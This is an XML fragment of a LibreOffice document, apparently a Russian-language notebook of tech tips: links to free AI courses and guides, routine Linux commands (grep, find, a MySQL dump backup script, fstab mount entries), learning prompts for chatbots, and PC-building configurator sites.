      <text:p text:style-name="P28">fuser -mv /path/to/mountpoint</text:p>
      <text:p text:style-name="P26">8 бесплатных гайдов, которые реально научат вас работать с ИИ - без воды и лишнего маркетинга. Подборка из самых полезных материалов по ИИ от OpenAI, Google, Anthropic и Kaggle. Все - на английском, бесплатно и с прикладным уклоном: как писать промпты, запускать агентов, внедрять ИИ в процессы и не лажать с этикой:</text:p>
      <text:p text:style-name="P26">1. Prompting 101 (Google): быстрый старт по созданию промптов: как формулировать запросы, структурировать инструкции и получать стабильные результаты. Идеально для новичков. Ссылка на курс - тут (https://services.google.com/fh/files/misc/gemini-for-google-workspace-prompting-guide-101.pdf)</text:p>
      <text:p text:style-name="P26">2. Building AI Agents (OpenAI): пошаговый гайд по созданию ИИ-агентов - от идеи до архитектуры. Объясняют, какие задачи агент должен решать, как его обучать и запускать в прод. Ссылка на курс - тут (https://cdn.openai.com/business-guides-and-resources/a-practical-guide-to-building-agents.pdf)</text:p>
      <text:p text:style-name="P26">3. Claude Code Best Practices (Anthropic): руководство по написанию надежного кода с помощью ИИ: как правильно взаимодействовать с Claude, структурировать задачи и тестировать нейро-помощника. Ссылка на курс - тут (https://www.anthropic.com/engineering/claude-code-best-practices)</text:p>
      <text:p text:style-name="P26">4. Identifying &amp; Scaling AI Use Cases (OpenAI): как находить реальные кейсы для ИИ и внедрять их в процессы. Разбор типичных задач в компаниях и подходов к масштабированию. Ссылка на курс - тут (https://cdn.openai.com/business-guides-and-resources/identifying-and-scaling-ai-use-cases.pdf)</text:p>
      <text:p text:style-name="P32">5. Trusted AI for Business (Anthropic): гайд по построению этичных и безопасных ИИ-систем. Полезен для тех, кто работает с данными пользователей или разворачивает ИИ в бизнесе. Ссылка на курс - тут (https://assets.anthropic.com/m/66daaa23018ab0fd/original/Anthropic-enterprise-ebook-digital.pdf)</text:p>
      <text:p text:style-name="P33">6. AI in the Enterprise (OpenAI): про то, как внедрять ИИ в корпоративную среду без бюрократии. Есть шаблоны, фреймворки и конкретные примеры бизнес-задач. Ссылка на курс - тут (https://cdn.openai.com/business-guides-and-resources/ai-in-the-enterprise.pdf)</text:p>
      <text:p text:style-name="P26">7. The Agents Companion (Kaggle): подробный whitepaper по созданию агентов: технические детали, лучшие практики и готовые решения. Хорошая база для разработчиков. Ссылка на курс - тут (https://www.kaggle.com/whitepaper-agent-companion)</text:p>
      <text:p text:style-name="P28">8. Advanced Prompt Engineering (Google Drive): сборник продвинутых техник промпт-дизайна: цепочки рассуждений, роли, инструменты для тонкой настройки и повышения точности ответов. Ссылка на курс - тут (https://drive.google.com/file/d/1AbaBYbEa_EbPelsT40-vj64L-2IwUJHy/view)</text:p>
      <text:p text:style-name="P26">Поиск текста во множестве файлов. Если нужно найти, где в проекте встречается определённая строка (например, DB_PASSWORD), не лезь в каждый файл руками! Используй мощную связку grep: grep -rnw '/путь/к/папке' -e 'DB_PASSWORD'</text:p>
      <text:p text:style-name="P28">Пояснение: -r - рекурсивный поиск по подкаталогам; -n - показать номер строки; -w - искать точное слово (не подстроку); -e - указывает, что дальше идёт выражение для поиска. Хочешь исключить определённые директории, например .git: grep -rnw --exclude-dir={.git,node_modules} '/путь/к/папке' -e 'DB_PASSWORD'</text:p>
      <text:p text:style-name="P26">Если нужно удалить пустые директории, команда find справится с этим просто и эффективно: find . -type d -empty -exec rmdir -v {} +</text:p>
      <text:p text:style-name="P26">Разбор:</text:p>
      <text:p text:style-name="P26">-type d - ищет директории,</text:p>
      <text:p text:style-name="P26">-empty - выбирает только пустые,</text:p>
      <text:p text:style-name="P26">-exec rmdir -v {} + - удаляет найденные директории через rmdir с подробным выводом (-v).</text:p>
      <text:p text:style-name="P28">Важно: rmdir удалит только те каталоги, которые действительно пусты, так что это безопасный способ очистки. Альтернативный, более краткий вариант той же задачи: find . -type d -empty -delete. Здесь -delete автоматически удаляет все найденные пустые директории.</text:p>
      <text:p text:style-name="P26">Фундамент ИИ - мастхев в 2025 году. Неважно, кто вы: проджект, маркетолог, дизайнер, аналитик или фаундер.</text:p>
      <text:p text:style-name="P26">Если вы работаете головой - базовые знания по AI/ML вам уже нужны. Не потому что это модно, а потому что иначе вы просто не поймете, как с этим работать.</text:p>
      <text:p text:style-name="P26">Как написать промпт, который сработает;</text:p>
      <text:p text:style-name="P26">Как объяснить ИИ, что ты хочешь;</text:p>
      <text:p text:style-name="P26">Как встроить ML в продукт или процесс.</text:p>
      <text:p text:style-name="P32">Вот четкая дорожная карта из бесплатных ресурсов, чтобы прокачаться с полного нуля:</text:p>
      <text:p text:style-name="P33">AI for Everyone (https://www.coursera.org/learn/ai-for-everyone) от Andrew Ng - база, которая объяснит, как ИИ работает и где его применять.</text:p>
      <text:p text:style-name="P26">AI Fluency (https://www.anthropic.com/ai-fluency) от Anthropic - объясняют принципы ИИ, как думать как инженер - простыми словами.</text:p>
      <text:p text:style-name="P26">Generative AI for Beginners (https://microsoft.github.io/generative-ai-for-beginners) от Microsoft - про текст, картинки и голос. Все, что делает ChatGPT - откуда оно берется и как использовать.</text:p>
      <text:p text:style-name="P26">AI Python for Beginners (https://www.coursera.org/learn/ai-python-for-beginners) от Andrew Ng - если хотите хоть НЕМНОГО понимать код, не быть «тем, кто просто стоит рядом».</text:p>
      <text:p text:style-name="P26">AI with Python (https://pll.harvard.edu/course/cs50s-introduction-artificial-intelligence-python) от Harvard - курс о том, как строить ИИ, если вы хотите разобраться чуть глубже.</text:p>
      <text:p text:style-name="P26">Machine Learning (https://www.edx.org/learn/machine-learning/harvard-university-data-science-machine-learning) от Harvard - про модели, данные и то, как делать точные предсказания.</text:p>
      <text:p text:style-name="P26">Neural Networks: Zero to Hero (https://karpathy.ai/zero-to-hero.html) от Andrej Karpathy - культовая серия лекций от бывшего директора AI в Tesla. Глубоко, но понятно.</text:p>
      <text:p text:style-name="P28">LLMs, RAGs, AI-агенты в реальных кейсах (https://github.com/patchy631/ai-engineering-hub) - как работают нейросети в продуктах - на практике.</text:p>
      <text:p text:style-name="P26">Bash-скрипт для выполнения дампа всех баз данных MySQL, используемых на сервере.</text:p>
      <text:p text:style-name="P26">1- Для запуска скрипта необходимо дать права на исполнение скрипту командой chmod +x dump_all_databases.sh.</text:p>
      <text:p text:style-name="P26">2- Запустить скрипт выполнив одну из следующих команд:</text:p>
      <text:p text:style-name="P26">./dump_all_databases.sh</text:p>
      <text:p text:style-name="P26">sh dump_all_databases.sh</text:p>
      <text:p text:style-name="P26">bash dump_all_databases.sh</text:p>
      <text:p text:style-name="P26">3- Дождататься, когда выполниться процесс. Дампы будут сохранены в формате YYYYMMDD.name_db.sql.</text:p>
      <text:p text:style-name="P26">#!/usr/bin/env bash</text:p>
      <text:p text:style-name="P26">databases=`mysql -e "SHOW DATABASES;" | tr -d "| " | grep -v Database`</text:p>
      <text:p text:style-name="P26">for db in $databases; do</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>if [[ "$db" != "information_schema" ]] &amp;&amp; [[ "$db" != "performance_schema" ]] &amp;&amp; [[ "$db" != "mysql" ]] &amp;&amp; [[ "$db" != _* ]] ; then</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/>echo "Dumping database: $db"</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/>mysqldump --databases $db &gt; `date +%Y%m%d`.$db.sql</text:p>
      <text:p text:style-name="P26"><text:s text:c="7"/># gzip $OUTPUT/`date +%Y%m%d`.$db.sql</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>fi</text:p>
      <text:p text:style-name="P26">done</text:p>
      <text:p text:style-name="P29">Осваиваем любой навык в 10 раз быстрее без платных онлайн-курсов:</text:p>
      <text:p text:style-name="P26">Составь мне 30-дневный учебный план, чтобы освоить [навык] с поэтапным переходом от новичка до продвинутого.</text:p>
      <text:p text:style-name="P26">Разбей [навык] на ежедневные 10-минутные уроки. Каждый должен включать теорию, пример и мини-задание.</text:p>
      <text:p text:style-name="P26">Перечисли самые частые ошибки новичков при изучении [навык] и объясни, как их избежать, используя более умные техники.</text:p>
      <text:p text:style-name="P26">Составь 5 мини-проектов, где можно применить [навык] на практике для ускоренного обучения через действие.</text:p>
      <text:p text:style-name="P26">Проведи опрос по теме [вставь тему]: включи тесты с выбором ответа, заполнением пропусков и ситуационные вопросы.</text:p>
      <text:p text:style-name="P26">Выступи как эксперт по [навык]. Вот моя работа: [вставь]. Дай честную обратную связь и рекомендации по улучшению.</text:p>
      <text:p text:style-name="P28">Создай трекер навыков, чтобы я мог фиксировать прогресс, оценивать уровень и получать рекомендации по следующим шагам на основе сильных/слабых сторон.</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6">Сохранение вывода команды top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d’, как показано ниже: top -n 5 -d 4 -b &gt;/backup/output_1.txt. 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6">-b : Работа в пакетном режиме (Запуск команды top в пакетном режиме для перенаправления вывода в другие программы или в файл)</text:p>
      <text:p text:style-name="P26">-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34">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35">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6">/dev/sda5: UUID="1efdbdda-df38-4f60-bb2c-81996eff323c" TYPE="swap" </text:p>
      <text:p text:style-name="P26">/dev/sda6: UUID="1eab3a42-b6c3-44e5-9e18-2ff284ecfba3" TYPE="ext4" </text:p>
      <text:p text:style-name="P26">/dev/sda7: LABEL="Data" UUID="5F573D4D2CFD981F" TYPE="ntfs"</text:p>
      <text:p text:style-name="P26">Для того чтобы подключить диск Data, который является 7-м разделом с файловой системой NTFS, редактируем /etc/fstab: sudo gedit /etc/fstab &amp;</text:p>
      <text:p text:style-name="P26">Раздел NTFS. Добавляем в fstab запись с соответствующим UUID: UUID=5F573D4D2CFD981F /media/5F573D4D2CFD981F ntfs-3g rw,users,locale=ru_RU.UTF-8 0 0</text:p>
      <text:p text:style-name="P26">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6">Тогда добавляемая в fstab запись будет выглядеть так: UUID=5F573D4D2CFD981F /media/WinData ntfs-3g rw,users,locale=ru_RU.UTF-8 0 0</text:p>
      <text:p text:style-name="P26">Раздел FAT и FAT32. Монтируем в каталог /media/Patition-FAT32, добавляя запись: UUID=номер_UUID /media/Patition-FAT32 vfat shortname=mixed,codepage=850,umask=002,uid=1000,gid=100,noauto,user 0 0</text:p>
      <text:p text:style-name="P28">Раздел Ext4. Монтируем в каталог /media/Ubuntu20: UUID=номер_UUID /media/Ubuntu20 ext4 rw,users 0 0. Теперь после перезагрузки указанные в fstab диски будут автоматически примонтированы и доступны для приложений.</text:p>
      <text:p text:style-name="P26">Собираем ПК с удовольствием:</text:p>
      <text:p text:style-name="P26">1. Technical city (https://technical.city/ru) - сервис, который поможет сравнить комплектующие и покажет, как работают различные сборки и какие игры они потянут. Позволяет собрать комп прямо в браузере, увидеть характеристики и оценить потенциальный FPS в современных играх. </text:p>
      <text:p text:style-name="P26">2. Конфигураторы от различного сетевого ретейла помогут лучше ориентироваться в текущих ценах: Regard (https://www.regard.ru/configurator), DNS (https://www.dns-shop.ru/configurator/?utm_medium=organic&amp;utm_source=google&amp;utm_referrer=https%3A%2F%2Fwww.google.com%2F), HyperPC (https://hyperpc.ru/configurator), Ситилинк (https://www.citilink.ru/configurator/), Edelws (https://edelws.ru/constructor/), Ironbook. (https://www.ironbook.ru/constructor/)</text:p>
      <text:p text:style-name="P28"><text:soft-page-break/>3. Полезный лайфхак: на этой странице (https://3dnews.ru/editorial/comp), внизу, можно найти список ежемесячных сборок от журнала 3D News. К слову, я так и собирал свой ПК, там очень удачные варианты.</text:p>
      <text:p text:style-name="P26">Совет дня для Linux: используйте column для красивого вывода: $ column -t -s',' Выравнивает CSV-данные по чистым столбцам.</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0:40:25.927000000</meta:creation-date>
    <meta:generator>LibreOffice/24.8.4.2$Windows_X86_64 LibreOffice_project/bb3cfa12c7b1bf994ecc5649a80400d06cd71002</meta:generator>
    <dc:date>2025-07-29T11:46:34.205000000</dc:date>
    <meta:editing-duration>PT14M19S</meta:editing-duration>
    <meta:editing-cycles>4</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="189" meta:paragraph-count="4787" meta:word-count="53175" meta:character-count="398915" meta:non-whitespace-character-count="347672"/>
    <meta:user-defined meta:name="AppVersion">16.0000</meta:user-defined>
  </office:meta>
</office:document-meta>
</file>